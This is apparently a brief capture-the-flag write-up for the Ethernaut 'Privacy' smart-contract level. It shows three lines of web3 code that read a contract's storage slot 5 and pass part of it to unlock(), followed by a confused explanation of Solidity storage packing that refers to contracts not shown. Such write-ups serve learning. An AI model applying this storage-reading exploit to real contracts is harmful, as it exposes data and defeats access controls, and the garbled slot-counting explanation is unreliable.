Create Privacy
var data = await web3.eth.getStorageAt(instance, 5);
var key = data.slice(2, 34);
await contract.unlock(key);

This level requires knowledge of solidity storage. You are asking for [data2]. obviously because 0 is the first in computing this is the 3rd value of the array which is the 5th Index storage because 0 is counted as one and the 2 uint 8 values are grouped as 1. Compile both contracts and then attack the main contract by placing the contract address into the attack function.